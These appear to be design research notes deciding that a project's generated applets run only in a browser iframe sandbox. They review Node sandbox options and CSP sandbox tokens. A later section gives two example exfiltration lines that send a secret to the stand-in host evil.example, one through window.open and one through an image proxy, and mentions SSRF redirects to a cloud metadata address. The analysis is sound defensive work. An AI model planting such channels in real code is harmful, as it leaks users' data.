# The execution sandbox for applet code

Research notes for Bernard, issue #431. Primary sources preferred; secondary commentary marked as such.

**Date:** 2026-09-02
**Scope:** Where an applet's generated code runs, and what contains it. Written to _decide_ the question, not to justify a preselected answer.

---

## 0. The answer, up front

**Applets do not need server-side code execution. The browser is the sandbox.**

The ladder of Node-side containment options in #431 — containers, QuickJS-in-WASM, OS-native sandboxes, `node --permission` — is **not needed for the applet feature**, because there is no applet-authored code running outside the browser to contain.

The decisive evidence is not an argument from first principles. It is that an official, finalized standard solves nearly the same problem this way, and shipped it in January 2026: **MCP Apps (SEP-1865)**. §1 covers it.

This does not mean "nothing is sandboxed". It means the containment boundary moves from _"a Node sandbox around applet code"_ to three boundaries Bernard is already planning:

| Boundary                                     | Contains                               | Issue |
| -------------------------------------------- | -------------------------------------- | ----- |
| Browser origin + iframe sandbox + CSP        | the applet's own JS/DOM                | #421  |
| Capability registry + per-app tool allowlist | what an applet may _ask Bernard to do_ | #420  |
| Per-applet SQLite, host-owned                | what an applet may _read and write_    | #422  |

§4 records the one place this gets subtle, and it is a real trap rather than a formality.

---

## 1. The precedent: MCP Apps (SEP-1865)

Finalized **2026-01-26** as the first official extension to the Model Context Protocol. An MCP server can return an interactive UI — dashboards, forms, multi-step workflows — that the host renders and that can call back into the server's tools.

That is structurally the same problem as an applet: _untrusted-ish generated UI, rendered by a host, able to trigger privileged work._

Its answer:

- The server publishes the interface as a `ui://` resource — **a self-contained HTML document**.
- The host renders it **in a sandboxed iframe**.
- The UI calls back over **JSON-RPC 2.0 over `postMessage`**.
- **No server-side execution of app-provided code.** Servers provide static HTML resources; execution occurs entirely within the browser's sandboxed environment.

Normative requirements worth lifting directly into #421:

> Host **MUST** construct CSP headers based on declared domains
> Host **MUST NOT** allow undeclared domains

with this default when no metadata is declared:

```
default-src 'none'; script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline'; connect-src 'none'
```

and, for web hosts using the double-iframe proxy:

> The Host and the Sandbox **MUST** have different origins

Sources: [SEP-1865 spec](https://modelcontextprotocol.io/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp) · [normative text](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx) · [announcement](https://blog.modelcontextprotocol.io/posts/2026-01-26-mcp-apps/)

### 1.1 Where Bernard should be _stronger_ than the standard

SEP-1865 enforces isolation at the **server connection** level and at the **iframe** level. It does **not** state cross-origin isolation between two different apps served by the same server.

That gap is precisely the shared-origin defect #421 exists to close, and which the epic's research already confirmed in five independent systems. So Bernard's per-applet origin (`<applet-id>.localhost`) is not merely conformant — it is a deliberate improvement on the standard, and #421 should say so rather than presenting it as table stakes.

### 1.2 The constraint this accepts

An applet cannot run its own backend logic. It is: HTML/CSS/JS, plus declared capabilities, plus host-owned persistence.

Measured against the epic's own motivating cases — a mood log, a checklist, "summarise this text", "describe this photo" — each is **a UI, a database write, and a scoped agent call**. None of them is a server. The constraint costs nothing that the motivating set asks for.

It also _reinforces_ #420 rather than fighting it. An applet that could run arbitrary server code would have an authority channel that bypasses the action registry entirely, which is the thing #420 is built to prevent. "No server-side applet code" and "capabilities, never a prompt" are the same principle applied at two layers.

---

## 2. Ruled out, verified against primary sources

The epic listed these; each is re-verified here, because a disqualification worth acting on is worth checking.

**`node:wasi`** — Stability: 1 (Experimental). Node's own documentation:

> The `node:wasi` module does not currently provide the comprehensive file system security properties provided by some WASI runtimes. Full support for secure file system sandboxing may or may not be implemented in future. In the mean time, **do not rely on it to run untrusted code.**

> While the capability features are supported, they do not form a security model in Node.js. For example, **the file system sandboxing can be escaped with various techniques.**

Source: [nodejs.org/api/wasi.html](https://nodejs.org/api/wasi.html)

**`node:vm`** —

> The `node:vm` module is not a security mechanism. **Do not use it to run untrusted code.**

Source: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)

**`vm2`** — worse than the epic recorded. A dozen-plus advisories with CVSS up to **10.0**, all sandbox escape to host RCE: CVE-2026-44007 (10.0, nesting bypass), CVE-2026-43999 (9.9, allowlist bypass), CVE-2026-26956 (9.8, WASM escape), CVE-2026-24118 (9.8, `__lookupGetter__`), CVE-2026-24781 (9.8, `inspect`), CVE-2026-22709 (Promise callback bypass), and more. Patched in 3.11.2 — except **CVE-2026-44008 and CVE-2026-44009, which remain unpatched** at time of disclosure, affecting every version through 3.11.1.

The pattern matters more than any single CVE: this is a proxy-based sandbox whose escapes keep arriving from unrelated corners of the language. Secondary aggregation: [The Hacker News](https://thehackernews.com/2026/05/vm2-nodejs-library-vulnerabilities.html) · [Endor Labs on CVE-2026-22709](https://www.endorlabs.com/learn/cve-2026-22709-critical-sandbox-escape-in-vm2-enables-arbitrary-code-execution) · [Qualys on CVE-2026-26956](https://threatprotect.qualys.com/2026/05/07/vm2-sandbox-escape-vulnerability-allows-attackers-to-execute-code-cve-2026-26956/)

**SES / Hardened JavaScript** — solves _authority_, explicitly not _resources_. From the SES README, on what a confined program can still do:

> execute for an indefinite amount of time, allocate arbitrary amounts of memory

and:

> Because every compartment shares one JavaScript agent, see Limitations for the availability and memory-exhaustion threats a Compartment cannot mitigate.

Disqualifying for LLM-generated code specifically, which infinite-loops routinely. Source: [endojs/endo SES README](https://github.com/endojs/endo/blob/master/packages/ses/README.md)

**`workerd`** — from its own README:

> workerd on its own does not contain suitable defense-in-depth against the possibility of implementation bugs. When using workerd to run possibly-malicious code, you must run it inside an appropriate secure sandbox, such as a virtual machine.

Source: [cloudflare/workerd README](https://github.com/cloudflare/workerd/blob/main/README.md)

---

## 3. The shared-backend question, reframed

#431 asked whether one shared backend serving all applets re-creates the shared-origin defect one tier down: if applet A's endpoint code runs in the same process as applet B's, a bug in A reaches B's data and B's grants.

**With no server-side applet code, the question dissolves — but not into nothing.** There _is_ one shared process (the host, #428), and it does run one codebase. The difference is that the code it runs is **Bernard's**, not any applet's. No applet contributes executable code to it.

So the isolation requirement does not disappear; it relocates, and it relocates onto mechanisms that are already scoped work:

- **Data**: per-applet SQLite, host-owned, browser never authoritative (#422). A applet cannot address another's database because it never holds a handle to one — it asks the host, and the host resolves by applet identity.
- **Authority**: the capability registry resolves `(appId, action)` against a closed table and produces a dispatch whose tool registry is the app's allowlist (#420). Applet A cannot invoke applet B's actions because the handle is bound server-side to A.
- **Origin**: `<applet-id>.localhost` per applet (#421), so browser-side storage and script context are separated too.

The residual risk is a bug in the **host's own** resolution logic — a path-traversal in the per-applet DB lookup, or a capability handle that resolves without checking its bound app. That is a real risk and it is the right one to have: it is one codebase, under test, rather than N pieces of generated code sharing a process.

---

## 4. The browser sandbox is not free — one trap that must not be missed

Recommending "the browser is the sandbox" carries an obligation to say where that fails.

**`allow-scripts` together with `allow-same-origin` defeats the sandbox entirely.** With both set and the framed document same-origin with the embedder, the framed page can reach `window.parent`'s DOM — and, worse, can **programmatically remove the `sandbox` attribute from its own iframe element**, at which point every restriction is lifted. MDN puts it plainly: it is

> no more secure than not using the sandbox attribute at all

The W3C validator flags the combination for this reason.

Sources: [MDN `<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe) · [MDN CSP `sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox)

**This is why #421's per-applet origin is load-bearing rather than cosmetic.** The prior framing was that one origin per applet separates `localStorage`, which is true. The stronger reason is that an applet needs `allow-scripts` to be an app at all — so the _only_ thing that keeps that grant safe is the applet document not being same-origin with the host page. Per-applet origins are what make a scripted sandbox meaningful, not just a tidy storage boundary.

MCP Apps arrives at the same requirement from the same constraint (`allow-scripts` + `allow-same-origin` for its sandbox proxy, hence "Host and Sandbox MUST have different origins"). Two independent designs converging on it is the signal.

Practical consequence for #421: `<applet-id>.localhost` per [RFC 6761](https://www.rfc-editor.org/rfc/rfc6761.html) is not a nice-to-have. If Safari's `*.localhost` resolution turns out not to work (still unverified, tracked as an acceptance item on #421), the fallback must be **per-applet ports** — another real origin — and _not_ one origin with `sandbox` attributes doing the separating, which is not separation at all.

---

## 5. If server-side execution is ever needed anyway

Recorded so a future ticket does not re-derive it. This ladder applies only if a use case appears that genuinely requires running applet-authored code outside the browser — none in the current motivating set does.

**QuickJS-in-WASM** is the strongest candidate and the epic's open question about it now has an answer. `quickjs-emscripten` documents `setInterruptHandler` (called regularly while the interpreter runs, throws `InternalError: interrupted`), `setMemoryLimit`, and `setMaxStackSize` — i.e. CPU, memory and stack bounds are a documented API rather than a hope. It also documents per-source isolation:

> You should create separate runtime instances for untrusted code from different sources for isolation… stronger isolation is also available (at the cost of memory usage), by creating separate WebAssembly modules

No WASI imports means the entire filesystem-escape bug class — the one Node's own WASI docs disclaim — is structurally unreachable.

Still unverified, and the thing to test before committing: whether the interrupt handler actually fires during **catastrophic regex backtracking**, which happens inside the regex engine rather than in the interpreter loop. If it does not, the DoS story has a hole. The performance figure the epic cites (~75× slower than Node on compute-heavy kernels) is a community benchmark; treat the magnitude as indicative and note that applet-shaped work is string/JSON glue, where the gap is far smaller.

Source: [quickjs-emscripten](https://github.com/justjake/quickjs-emscripten) · [QuickJSRuntime API](https://github.com/justjake/quickjs-emscripten/blob/main/doc/quickjs-emscripten-core/classes/QuickJSRuntime.md)

**Containers** remain the right _opt-in_ tier — strong, well-understood isolation — and the wrong default, because "install Docker to use a checklist" fails the no-prerequisites test. **OS-native sandboxes** (Landlock/bubblewrap, `sandbox-exec`) fail the cross-platform test most directly: `sandbox-exec` is deprecated and Windows has no clean equivalent. **`node --permission`** is a layer, not the layer.

---

## 6. What this decides, and what it leaves open

**Decided:**

1. No server-side execution of applet code. The browser is the sandbox. #431 closes on this.
2. The Node-side containment ladder is not needed for applets, and §5 preserves the analysis if that ever changes.
3. #421 should adopt SEP-1865's normative CSP shape as its starting point, and treat per-applet origins as a _security_ requirement (§4), not a storage-hygiene one.
4. The shared-backend risk resolves into #420/#421/#422 rather than into a sandbox (§3).

**Open, and belonging to other tickets:**

- Safari `*.localhost` resolution — acceptance item on #421. §4 raises the stakes: the fallback must be per-applet **ports**, never shared-origin-plus-sandbox-attributes.
- Whether `connect-src` should ever be widened past `'none'` for an applet, and what declares it. SEP-1865 has a declared-domains mechanism; Bernard may not want one at all.
- Attachments reaching a dispatch (#427) is what makes "describe this photo" work. It is a capability-layer gap, not a sandbox one.

**Deliberately not researched:** container runtime selection, Docker Desktop licensing, per-applet container startup latency. All are moot under the decision above, and re-opening them belongs with a concrete use case that needs server-side execution.

---

## 5. What the seal costs, and what a user can lift (#467, #468)

Added while implementing per-applet CSP grants. §4 above records where the
browser sandbox fails; this records what it costs when it works, which is the
half three separate issues had each been guessing at.

### 5.1 What is measured, and what is cited

Stated separately on purpose, because the difference is exactly what #468 asks
to close and it is only half closed.

**Measured on this machine, against the running host:**

- The served header matches `cspFor()` byte for byte — no proxy, no browser,
  nothing rewriting it in between.
- A grant applies **per applet**: `news-headlines` granted
  `img-src https://cdn.arstechnica.net https://ichef.bbci.co.uk` served exactly
  that, while `demo` on its own port stayed byte-identical to the ungranted
  baseline in the same instant.
- A revoke applies **on the next request, with no restart** — the same running
  daemon narrowed back to `img-src 'self' data:` immediately after
  `bernard app csp news-headlines --img-src ""`. This is what the per-request
  read buys, and a test fails when the value is captured at startup instead.

**Cited, not measured:** that a `sandbox` header with no navigation token
blocks a link click outright, including for a top-level document. Sources:
[MDN CSP `sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox)
and [w3c/webappsec-csp#647](https://github.com/w3c/webappsec-csp/issues/647),
which is explicit that omitting `allow-top-navigation` "would prevent any
redirections to any other page, even if triggered from within the sandboxed
document; irrespective of whether they are triggered by a user or
programmatically".

The symptom matches: `~/.local/share/bernard/apps/news-headlines/index.html`
builds every headline as `a.target = '_blank'` and reports that a normal click
does nothing while ctrl+click works — consistent with the browser treating the
latter as a chrome-level action rather than a navigation initiated by the
sandboxed document.

**Still outstanding:** the devtools session. Nothing here has been observed in a
browser, so what is _not_ yet established is which token actually fixes the
click, what the opened window can then do, whether
`allow-popups-to-escape-sandbox` alone does anything without `allow-popups`,
and whether the PWA install offer (#429) survives each token. Do not let the
grant mechanism's existence be mistaken for that measurement having happened.

### 5.2 The tokens, and what each one costs

| Token                                     | Buys                                              | Costs                                                                                                                                                                       |
| ----------------------------------------- | ------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `allow-popups`                            | `target="_blank"` opens a window                  | The popup **inherits the sandbox**: no scripts, no same-origin, no forms. An article opens broken, more confusingly than not opening. Never granted alone.                  |
| `allow-popups-to-escape-sandbox`          | The opened window is an ordinary browsing context | Meaningless without `allow-popups`; `normalizeSandboxTokens` therefore stores the pair. `window.opener` stays live, so `rel="noopener"` matters — `page-validate.ts` warns. |
| `allow-top-navigation-by-user-activation` | A plain `<a href>` navigates the tab              | The click **replaces the applet**. Right for "open the docs", wrong for a feed.                                                                                             |

Never grantable, and enumerated in `csp-grant.ts` rather than left to judgement:
`allow-top-navigation` (no activation requirement — drive-by), `allow-forms`
(`form-action 'none'` closes an exfiltration channel `connect-src` does not
cover), `allow-downloads`, `allow-modals`, and `allow-scripts` /
`allow-same-origin`, which are unconditional already — naming them as grants
would imply they could be withheld, and §4 explains why withholding
`allow-same-origin` is the actively broken configuration.

**A sandbox token is not origin-scoped**, and that is its real cost. There is no
way to express "popups to nytimes.com only": the grant is "this applet may open
windows", so a `window.open('https://evil.example/?d=' + secret)` behind a
button is a channel. Weaker than `img-src` — it needs a user gesture and a
window visibly appears — but real, and the CLI says so on every read.

### 5.3 The image proxy, and why it is not the first answer

#467 proposes `/__bernard/img?url=` as an alternative to widening `img-src`,
on the grounds that it "keeps the exfiltration channel closed, which the CSP
grant does not". **That reason is wrong**, and the correction matters more than
the conclusion: `<img src="/__bernard/img?url=https://evil.example/?d=SECRET">`
exfiltrates exactly as well, the request merely leaving from Bernard's socket
instead of the browser's. What a proxy actually buys is that the channel becomes
_observable, cappable and revocable_. That is real; it is not closure, and it
needs the same per-applet allowlist the CSP grant needs before it closes
anything.

It also requires an SSRF primitive that exists nowhere in this repo —
`src/tools/web.ts` calls bare `fetch` with no host checks. Doing it properly
means scheme refusal, refusing loopback / private / link-local ranges
**re-checked after every redirect** (a public host that 302s to
`169.254.169.254` defeats a pre-flight check, and Node's `fetch` follows
redirects internally, so this needs `redirect: 'manual'` and a hand-rolled
loop), a size cap enforced while streaming, a content-type allowlist with SVG
excluded, and — to close DNS rebinding — a custom dispatcher pinning the
resolved address. Worth building when an applet needs origins that are not
known in advance. The grant serves the motivating case, which is a feed pulling
from a handful of named CDNs.

Evidence for that being the shape of the real case: the applet that prompted
both issues had already hand-built the proxy. `fetch-thumbs.sh` in its asset
directory curls each thumbnail to local disk so the page can reference it
same-origin — a workaround its author had to invent because there was no way to
ask.
